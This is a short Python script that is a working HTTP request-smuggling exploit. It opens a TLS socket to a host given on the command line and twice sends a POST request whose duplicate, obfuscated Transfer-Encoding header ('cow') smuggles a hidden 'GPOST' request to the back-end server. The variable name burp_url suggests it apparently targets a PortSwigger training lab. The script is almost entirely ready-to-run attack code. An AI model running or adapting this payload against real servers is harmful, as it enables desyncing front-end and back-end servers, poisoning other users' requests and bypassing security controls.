import socket, ssl
import sys
import requests

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
host = burp_url[8:]

context = ssl.create_default_context()
sock = socket.create_connection((host, 443))
conn = context.wrap_socket(sock, server_hostname=host)

for _ in range(2):
    request = (
        "POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-length: 4\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Transfer-encoding: cow\r\n\r\n"
        "5c\r\n"
        "GPOST / HTTP/1.1\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 15\r\n\r\n"
        "x=1\r\n"
        "0\r\n\r\n"
    )

    conn.send(request.encode())
    response = b""
    data = conn.recv(4096)
    response += data

conn.close()
print(response.decode())

requests.get(burp_url)
